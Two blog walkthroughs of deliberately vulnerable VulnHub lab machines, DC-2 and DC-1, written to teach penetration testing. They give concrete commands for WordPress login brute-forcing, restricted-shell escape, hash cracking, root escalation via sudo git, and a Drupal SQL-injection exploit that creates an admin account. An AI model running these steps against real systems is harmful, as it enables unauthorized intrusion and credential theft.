","date":"11-20-2023","objectID":"/dc-2/:2:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exporting Environment Variables To speed up a few future commands, let’s export a few environment variables to include the IP address we obtained earlier. export IP=\"*IP*\" –\u003e This will create a variable, named $IP, containing DC-2’s IP address. - e.g. export IP=\"192.168.56.111\" export URLdir=\"http://*IP*/FUZZ/\" –\u003e Variable for fuzzing directories. We append a forward slash / to specify directories. - e.g. export URLdir=\"http://192.168.56.111/FUZZ/\" export URLfile=\"http://*IP*/FUZZ\" –\u003e A var useful for fuzzing files. - e.g. export URLfile=\"http://192.168.56.111/FUZZ\" Let’s make sure we’ve exported the variables correctly by running echo $IP; echo $URLdir; echo $URLfile echo our $IP, $URLdir, $URLfile vars PS If you ever export variables and then create a second shell, the second shell will only contain the previously exported variables if it’s a child shell of the first. ","date":"11-20-2023","objectID":"/dc-2/:3:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration At this point, we’re set to start scanning and enumerating DC-2! Since this is a blog post, I’m going to keep things somewhat short but feel free to dig into anything/everything you can. If you find another path to go down, do it! It can help you learn what to look for and how to prioritize those initial findings. This phase of a pentesting process can and should consume the largest amount of time, as you’re wanting to find everything you can. Not only will this help if you were to get stuck but, if this were a real world pentest, you’d want to provide the customer an accurate report by being thorough! ","date":"11-20-2023","objectID":"/dc-2/:4:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"nmap scan Anyways, let’s get to it by starting with a nmap scan against DC-2’s IP. nmap $IP -T4 -p- -sC -sV --open $IP –\u003e is the previously exported IP address of DC-2. -T4 –\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- –\u003e tells nmap to scan ALL 65,535 TCP ports. -sC –\u003e specifies nmap to run default scripts. -A includes this. -sV –\u003e enables version detection. -A includes this. --open –\u003e only shows ports that are “open”. Safe against a purposely vulnerable box but not suggested for a real pentest as it may hide a reportable finding. nmap results - Linux box w/ http on 80, ssh on 7744 Analyzing nmap scan Debian Linux running services http(port 80) and ssh(port 7744). http(80) may only be accessible via hostname and not IP. Needs tested. Many reasons to this but maybe it’s hosting more than one webapp? Think VHOST. ssh(7744) running on non-default port but that doesn’t particularly mean anything. ","date":"11-20-2023","objectID":"/dc-2/:4:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Manual inspection of http(80) Let’s open a browser and visit the target IP(DC-2) and see what it shows. It’s redirecting us to “http://dc-2/” domain? If you look at the nmap results, you’ll see nmap already reported this to us. “Did not follow redirect to http://dc-2/” I’d suspect that port 80 is configured with a name-based virtual host, meaning that one IP address could host multiple sites served by the hostname only. ","date":"11-20-2023","objectID":"/dc-2/:4:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Adding DC-2 to /etc/hosts In order to tell our attack box that we want $IP to resolve to DC-2, we simply add this information to the /etc/hosts file on the attackbox. Once we’re finished with the DC-2 box, we’ll simply revert this change. sudo nano /etc/hosts A few spaces below the existing content, let’s add *IP* dc-2. NOTE! Spacing between the IP address and hostname is (1) TAB! Not spaces via SPACEBAR. Now we do keyboard combos of CTRL+O then ENTER(to save it) followed by CTRL+X(to exit) Now confirm the changes by running cat /etc/hosts End result.. added dc-2 into /etc/hosts ","date":"11-20-2023","objectID":"/dc-2/:4:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Rerun nmap after /etc/hosts update Look how our redirect is working and nmap is able to grab the proper banners! nmap results after /etc/hosts update - proper banners ","date":"11-20-2023","objectID":"/dc-2/:4:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Reinspecting http(80) Let’s visit http://dc-2 in our browser.. Access to the webapp, finally! Looks like WordPress. Wordpress CMS found CMS stands for Content Management System. It’s an app that allows multiple contributors to create, manage, and modify content on a website. Wordpress(WP) is a common CMS in the wild. ","date":"11-20-2023","objectID":"/dc-2/:4:5","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating our notes Let’s notate what we’ve found and what possible tools/techniques to try. As we move forward, let’s continue to update our notes. Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS 80 : Wordpress 4.7.10 What to try: view source, file/directory busting/fuzzing, wpscan 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) What to try: searchsploit for vulns When finished, remove IP dc-2 from /etc/hosts file ","date":"11-20-2023","objectID":"/dc-2/:4:6","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Fuzzing http/80 Now that we can access the webapp as intended, let’s move onto fuzzing! Fuzzing is a technique used to inject something into an app and filter the responses. Since we’re dealing with a webapp, we’ll be using a tool called wfuzz to brute-force the webapp’s file and directory paths. wfuzz will simply brute-force the webapp’s file/directory parameter(or wherever we place the wordFUZZ), against a specified wordlist. For each word sent, it’ll record the webapp’s response. We then filter out the responses we don’t need, like 404’s, and a list is created! This can help us find hidden login pages, accidentally exposed files, etc. and save us lots time! There’s various tools that can accomplish this task e.g. dirbuster, ffuf, wfuzz, etc but today I’ll stick with wfuzz. I’ll make sure to use different tools on DC-3, so we don’t become repetitive and boring. Promise! 😉 I suggest you try any trusted tools and find your favorites. Go check out the resources page as it contains a large list of tools. Fuzzing $URLfile Let’s start with fuzzing files by running the following command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c –\u003e provides a color output for the webapp’s response column. -z file,/*wordlist* –\u003e specifies payload type and points to file wordlist. --hc 403,404 –\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile –\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. Let’s manually visit each recorded response, in our browser, to see what it presents! ignore the last 404 Wordlist Tip If you lack the SecList wordlists(already included in Kali’s repo), you can find it at Daniel Miessler’s Github Page. It’s a collection of various lists that can be used for various assessments! Very useful! SecLists works great for CTFs but for real world pentesting, you’ll may be using custom or something found in my resources posts. wfuzz results - files files worth notating http://dc-2/xmlrpc.php –\u003e XML-RPC API? We can use this to brute-force logins without restrictions. The wpscan tool can abuse this. We’ll use wpscan later! http://dc-2/wp-login.php –\u003e wp login page Potential login abuse techniques? Think email/user enumeration or brute-forcing. http://dc-2/readme.html –\u003e info disclosure. versioning? PHP, MySQL, mod_rewrite apache module? Injections? Targeted exploits? http://dc-2/wp-links-opml.php –\u003e info disclosure. WP 4.7.10 confirmed Fuzzing $URLdir Let’s now fuzz against directories. We’ll simply change the exported variable and wordlist options in our previous command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 $URLdir -z file,/*wordlist* –\u003e changed to a directories wordlist. $URLdir –\u003e exported variable that includes appended backslash, so wfuzz searches for directories. Let’s manually visit each recorded response, in our browser, to see what it presents! ignore the last three responses wfuzz results - directories directories worth notating http://dc-2/wp-includes/ –\u003e contains core WP file/folders http://dc-2/wp-includes/css/jquery-ui-dialog.min.css shows jQuery 1.11.4? Version may be wrong when compared to whatweb. http://dc-2/wp-admin/ –\u003e contains file/folders to the WP dashboard panel but redirects to /wp-login.php http://dc-2/wp-content/ –\u003e contains plugins/themes for WP ","date":"11-20-2023","objectID":"/dc-2/:4:7","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Confirm WebTech with Wappalyzer Regarding the potential WebTech findings in the /readme.html file, let’s confirm those by visiting the site with a browser extension called Wappalyzer. To start using, simply: Install it through the browser’s extension manager Visit http://dc-2 with our browser and see which tech stack it’s using. Wappalyzer Results We’re able to confirm: Wordpress 4.7.10 –\u003e Confirmed with nmap after /etc/hosts update Apache HTTP Server 2.4.10 –\u003e Confirmed with nmap PHP –\u003e Found potential use through /readme.html. Version 5.2.4? Debian –\u003e Found through apache 404 error. Info Disclosure MySQL –\u003e Found in /readme.html. Version 5.0? jQuery 1.12.4 and jQuery Migrate 1.4.1. Versioning is off to our 1.11.4 finding. –\u003e Found in /wp-includes directory. Version 1.11.4? Twenty Seventeen Theme –\u003e Found with wpscan. Version 1.2? ","date":"11-20-2023","objectID":"/dc-2/:4:8","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Findings \u0026 Updating Notes We have some additional info to add into our notes. Let’s also create a to-do section. PS If you attempt admin:password, at the /wp-login page, you’ll see that username enumeration is possible! If the XML-RPC API wasn’t enabled, we could possibly attack this login page. /wp-login.php user enum possible TO-DO LIST Things to check: Use wpscan to: enumerate usernames brute-force WP login by abusing the XML-RPC API? Maybe create a custom wordlist? Hint from Flag 1 referencing a tool called cewl. Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP –\u003e admin , 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan can be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"11-20-2023","objectID":"/dc-2/:4:9","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"wpscan - Enumerating Usernames wpscan is a wordpress security scanner that allows us to assess wordpress apps. Our goal is to use wpscan to enumerate usernames, cewl to create a custom password list, and finally use wpscan to brute-force logins via the XML-RPC API that’s enabled, as it doesn’t limit login attempts. To enumerate users with wpscan, simple run wpscan --url http://dc-2. Looks like we have three WP users, including the admin user we’ve already confirmed via /wp-login.php. Let’s add these users to our notes. admin; jerry; tom wpscan - user enumeration ","date":"11-20-2023","objectID":"/dc-2/:4:10","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"CeWL - Creating word lists CeWL, Custom Word List Generator, spiders the specified URL and creates a list per the flags specified. After a little googling(google is your friend!), it looks like wordpress uses a 10 character minimum requirement. So, we’ll be sure to use the flag -m with a argument of 10 to specify this minimal length requirement. If you haven’t already, create a folder to store any related dc-2 files into, including the next cewl file we create. Now let’s run the cewl tool! cewl http://dc-2:80/ -m 10 -w $PWD/dc-2-cewl.txt -m 10 –\u003e specifies the minimum length of 10 characters -w $PWD/dc-2-cewl.txt –\u003e tells cewl to export file name “dc-2-cewl.txt” into the current working directory(var of $PWD) cat dc-2-cewl.txt and you’ll see these results. cewl results Let’s also create a list for usernames called dc-2-users.txt, so we can use it along side the password list, dc-2-cewl.txt, we just created. echo -e \"admin\\njerry\\ntom\" \u003e dc-2-users.txt -e–\u003e echo recognizes \\n(new line), and others additional syntax. \u003e –\u003e overwrites data in the “dc-2-users.txt” file Now that we have some usernames and a custom password wordlist, let’s update our notes and then exploit the XML-RPC API 😃 ","date":"11-20-2023","objectID":"/dc-2/:4:11","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating notes before exploiting TO-DO LIST Things to check: Use wpscan to: Brute-force WP XML-RPC with wpscan, dc-2-users.txt, and dc-2-cewl.txt After we get into wordpress, look for injection points, vulnerable plugins, etc Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP(admin;jerry;tom) 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan will be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"11-20-2023","objectID":"/dc-2/:4:12","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exploiting ","date":"11-20-2023","objectID":"/dc-2/:5:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing WP XML-RPC XML-RPC is an API that allows another application to publish, edit, delete posts, upload new files, get a list of commands, edit comments all through a POST request. The reason this API is nice for attacks is there’s no limits or throttling to the amount of requests we send, plus it allows access to many different WP features. Since we’re going to be brute-forcing the login creds of a wordpress site, wpscan will first check and, if present, use this XML-RPC API as the attack vector. If it is absent, wpscan will shift to using the wp-login.php login fields. ","date":"11-20-2023","objectID":"/dc-2/:5:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Validating WP Creds Let’s get to it and run the attack against XML-RPC wpscan --url http://dc-2/ --disable-tls-checks -U dc-2-users.txt -P dc-2-cewl.txt --url –\u003e specifies the URL to attack which is DC-2’s WP site --disable-tls-checks –\u003e disables TLS checks for HTTPs as we’re on HTTP -U –\u003e location of the username list to be used -P –\u003e location of the password list to be used wpscan - verified two valid combinations We have two valid credentials for WP; jerry:adipiscing tom:parturient After logging into both accounts, it looks like they’re limited accounts. I was unable to upload *.php files through the media upload form. The plugins and themes pages are also absent, meaning we lack access to abusing them. So, without digging into this further, I think we’re meant to go about this by other means. So, let’s try using the credentials, we validated against wordpress, against the SSH service on port 7744! Maybe we’ll get lucky and get ssh access into the debian server(dc-2). ","date":"11-20-2023","objectID":"/dc-2/:5:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Credential reuse on SSH/7744 Let’s try logging in as jerry: ssh jerry@dc-2 -p 7744 answer yes try adipiscing –\u003e Permission denied, please try again. try parturient –\u003e Permission denied, please try again. CTRL+C to cancel our attempts as jerry Try again but with username “tom”: ssh tom@dc-2 -p 7744 try parturient We’re in!!! tom@dc-2 -p 7744 successful! ","date":"11-20-2023","objectID":"/dc-2/:5:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Escaping a Restricted Shell We’ve gained shell but it’s restricted. By running ls $PATH, we’ll see that we are limited to four binaries: less, ls, scp, vi If you run any other command, you’ll see the -rbash reference meaning “restricted bash”. rbash - restricted bash So first thing is first, we need to escape this restricted shell that user “tom” is restricted to. We can use vi to escape the restricted shell. In our SSH terminal: vi type :set shell=/bin/bash then enter type :shell then enter This will escape the restricted shell and we can confirm by running cd /. Once we’ve gained shell, it’s nice to establish a proper and stable shell with tty. As we’re connected through SHH, we won’t need to spawn a shell through python but setting up PATH variables, etc will make our life easier. Anything struck-through represents that the command isn’t needed as we’re using SSH to establish a stable shell. python -c 'import pty; pty.spawn(\"/bin/bash\")' –\u003e spawn an interactive shell via python export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp –\u003e setting additional PATH variables export TERM=xterm-256color –\u003e provides us some color in our output alias ll='ls -lsaht --color=auto' –\u003e sets an alias ll that runs ls -lsaht --color=auto Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 We should now have a unrestricted, fully interactive tty shell, with a ll command that runs ls -lsaht --color=auto BUT we’re still restricted in the form of system permissions. Hence, we’re moving onto privesc! ","date":"11-20-2023","objectID":"/dc-2/:5:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Privilege Escalation ","date":"11-20-2023","objectID":"/dc-2/:6:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Enumerating user tom Let’s run through some simple enumeration of the current user, tom, and see if we can find anything to steal or exploit! sudo -l –\u003e requests for a password and no password, we know, works. find / -perm -u=s -type f 2\u003e/dev/null –\u003e as we lack sudo, none of the SUID or GUID binaries allow for privesc abuse. mysql access is denied for tom. Same issue with sudo. No working password. (It’s forcing us to follow a path…) cat ~/.bash_history –\u003e nothing interesting in bash history. Let’s not forget that we may have access to the WP CMS webroot! Maybe we can steal sensitive information within the database? cd /var/www/html –\u003e Looks like we now have access to the WP files! After digging around in the html folder, I found that the wp-config.php contains MySQL creds! wpadmin:4uTiLL wpadmin:4uTiLL creds in wp-config.php Future me reporting in… To root this box, we’re not needing to gather this SQL info nor do we need to crack hashes. We could skip this section and move onto Abusing jerry’s sudo privs with git but what’s the fun in that! ","date":"11-20-2023","objectID":"/dc-2/:6:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Hash algorithms w/ hash-identifier We have three hashes to crack. admin:$P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY. tom:$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO. jerry:$P$BRCcbpudGlBukTwA7kJsb.rafAL4il. To crack them, we’ll be using a tool called hashcat, but first, we need to determine which hash algorithm was used. SHA1, MD5, etc? hash-identifier is the perfect tool for this. Open up a new terminal and leave our current SSH connection alone, as we still need it! hash-identifier –\u003e this will execute and open the program’s CLI. We will simply copy/paste one of the hashes into the command-line and hit the ’enter’ key. hash-identifier responds with MD5(wordpress) Hit CTRL+C, to exit, and let’s now get into hashcat We now know we’re dealing with a MD5(WordPress) hash algorithm. ","date":"11-20-2023","objectID":"/dc-2/:6:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat hashcat is a “password recovery” tool that utilizes your CPU and, if properly configured, your GPU to crack hashes. In this example, we’ll be using the CPU. Technique becomes very important when cracking hashes, as it may differentiate between minutes vs days when cracking a hash We know the hashes were made using the “Wordpress(MD5)” algorithm, so we need to make sure we tell hashcat this. Let’s start by looking up which argument we should provide to the flag -m. m is the flag that we use to specify which algorithm we’re attacking. There’s many lists our there but here’s a quick reference. Generic Hash Types Simply CTRL+F for “WordPress” and you’ll land on a argument value of 400. Now we know which argument value to provide the flag -m. PS - Export the three found hashes, that were in the MySQL database, into a text file as we’ll need to specify that file in our hashcat command Let’s attack the hashes with our previously created cewl list called dc-2-cewl.txt. hashcat -m 400 -a 0 *location/hashes-to-crack.txt* dc-2-cewl.txt m –\u003e specifies the algorithm the hashes were created with. a 0 –\u003e tell hashcat to do a straight attack, meaning it’ll run straight through each word without altering it’s structure/order of characters. We’re able to crack the two previously found passwords but not the admin password… $P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.:parturient $P$BRCcbpudGlBukTwA7kJsb.rafAL4il.:adipiscing two hashes cracked, admin not cracked Since we have the hashes and know the algorithm, we could crack the admin password at a later time but I’ll pass. We’ve stolen the sensitive data from the MySQL database and ran through some cewl / hashcat examples. The concepts are what matter here. 😃 ","date":"11-20-2023","objectID":"/dc-2/:6:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing jerry’s sudo privs with git Since it seems the box wants us to go for jerry now(tom \u0026 jerry cartoon…), let’s login as jerry by: su jerry –\u003e enter the WP password we found for jerry –\u003e adipiscing We’re in as jerry! sudo -l –\u003e looks like jerry has root privs to the binary git jerry - sudo -l shows git as root! What do you know… git can be abused(confirmed via GTFObins), if the user has sudo perms, to gain privesc! Let’s gain root! sudo git -p help config –\u003e enter !/bin/sh –\u003e enter ","date":"11-20-2023","objectID":"/dc-2/:6:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"ROOTED! ROOTED! ","date":"11-20-2023","objectID":"/dc-2/:7:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-1 from the DC-Series(VulnHub).","date":"11-19-2023","objectID":"/dc-1/","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Let’s root DC-1! Details can be found at https://www.five86.com/dc-1.html Open this to see the box's overview pulled from the above website. DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. If you’re ever needing to find the IP of a local box, sudo netdiscover -r *ip/cidr* will do the trick. -r specifies the range. If this tool doesn’t work, you could have routing issues. -i can specify the interface you need to run against. Another nifty tool is ip route get *ip* as this will tell you what route a packet will take to the ip specified. Anyways.. to the box! ","date":"11-19-2023","objectID":"/dc-1/:0:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Export Environment Variables Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address. Your IP value will most likely differ, so adjust accordingly: export IP=\"192.168.56.110\" export URLdir=\"http://192.168.56.110/FUZZ/\" \u003c– Directories export URLfile=\"http://192.168.56.110/FUZZ\" \u003c– Files appended backslash depicts directories vs files 😃 You can then test your exported vars by running echo $varname: e.g., echo $IP would respond with 192.168.56.110. ","date":"11-19-2023","objectID":"/dc-1/:1:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Scanning \u0026 Enumeration Before we move forward, let’s make a list that’ll include the important bits as we move forward. We’ll add/update as we go through the box, so we can reference it. Box Name: DC-1 IP: 192.168.56.110 ","date":"11-19-2023","objectID":"/dc-1/:2:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"nmap Let’s start with a simple nmap scan to see what we’re playing with: nmap $IP -T4 -p- -A --open $IP = target’s IP via exported variable. -T4 = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- = Tells nmap to scan all ports(TCP by default).. -A = Runs four options under one: OS detection Version detection Script scanning Traceroute --open = runs -A only against ports that are open. Idea is to speed up slow scans. Running a local box won’t cause much issues but when you’re running a slower scan or the latency is high, this option can help. DC-1 nmap scan Let’s start with port 80 as it’s most likely the weakest entry point due to the potential services listed in robots.txt. SSH, on port 22, isn’t much use as we currently lack keys, usernames, and passwords. We could brute force but it’ll take a while and it’s not guaranteed to work. rpc could be of use but I’m not seeing anything obvious in the list of services, so we’ll skip this for now. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22- Drupal CMS v7.xx - \u003c– Focus here first 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"11-19-2023","objectID":"/dc-1/:2:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Manual Inspection of 80/webapp Open up a browser and enter the box’s IP address to visit the IP’s http service. Since it’s running on port 80, there’s no need to specify the port eg. 192.168.56.110 :80 DC-1 http service Manually inspect the page source. Findings are: Drupal 7 = nmap already told us this Page Source of Drupal Let’s see if we can enumerate the responses regarding the login fields at the /user/ directory No response allows us to differentiate between username nor passwords. If we could get a response saying “This email does not exist”, then that would allow us to brute force enumerate emails. Login Enum Fail Same goes for recovering an account. Forgot Enum Fail Default credentials? Seems like that’s a negative. Drupal forces a password change when logging in for the first time. Answer found via google 😃 /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting. sqlite mysql php POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found. POST also shows PHP/5.4.45-0+deb7u14. nmap didn’t see this. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ? 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"11-19-2023","objectID":"/dc-1/:2:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Fuzzing webapp/80 I tried fuzzing but it didn’t result in anything interesting beyond what robots.txt already told us. Example commands would be… wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir I also tried dirbuster with similar results. Some results I got were: 000000007: 200 54 L 164 W 3151 Ch “install.php” 000000005: 200 0 L 6 W 42 Ch “xmlrpc.php” 000000237: 200 9 L 15 W 283 Ch “rss.xml” ","date":"11-19-2023","objectID":"/dc-1/:2:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Researching Vulnerabilities I was hoping to find something more than just a general version 7 of Drupal… e.g., 7.26, but that’s okay. Let’s go ahead and run searchsploit against Drupal and see what we get back. searchsploit Drupal DC-1 Drupal 7 searchsploit Well, good news is there isn’t many version 7 exploits! We’re looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn’t require authentication, although we can make a user at /user/register. There’s always the chance a non-privileged user would have enough privs to execute such an exploit. The Drupalgeddon2 sticks out to me but I want a more manual approach and something that’ll be sure to work with version 7.xx … Let’s go with the php/webapps/34992.py. We could use msfconsole and let that automate most of what we’ll do below, but what’s the fun in that! My thought process is that we’ll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we’ll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that’s a start… Download the script to a local directory and cat the contents… searchsploit -m php/webapps/34992.py \u003c– This will download the script to the current directory using searchsploit. Love this feature. cat 34992.py \u003c– This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don’t hold your hand, so knowing how to read code is very helpful. You’ll see this line which tells us the command options needed, so we can successfully execute the script against the target. DC-1 Drupal 7 exploit usage: %prog **-t http[s]://TARGET_URL -u USER -p PASS**\\n So we’ll try… python2 34992.py -t http://$IP -u owned -p owned This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I’m just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good. ","date":"11-19-2023","objectID":"/dc-1/:3:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploitation Well… let’s get to it. python2 34992.py -t http://$IP -u owned -p owned IF YOU GET A “SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(…)?”… you’re not running the script under python2… which is required. DC-1 Drupal 7 admin created Now let’s test the login page… with owned:owned. ADMIN LOGGED IN DC-1 Drupal 7 admin logged in Now that we’re in a CMS, we should look around and enumerate what we can… ","date":"11-19-2023","objectID":"/dc-1/:4:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Enumerating Drupal admin pages It’s important to gather as much information as you can as it might come into handy later on… so let’s see what we can find inside Drupal as admin. Username Fred found Username admin found So brute forcing may have been an option but maybe it has lockout? flag3 is found under content… Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow. This seems to hint to maybe the find command allowing us access to certain files we shouldn’t have access to? Sticky bit? Worth checking once we’re in… Let’s look in the module tab and see if there’s anything php related… I found and enabled the follow module… “PHP filter”. It may just allow us to upload malicious PHP code. DC-1 Drupal 7 Enabled PHP Filter Not that it’s enabled, we should see if we can give it administrator rights.. Click the “Permissions” and then check the “administrator” user box for “Use the PHP code text format” DC-1 Drupal 7 PHP code permissions DC-1 Drupal 7 admin perms for php code I’m hoping by checking the admin box, this will allow any code inputted to be executed with admin privs. 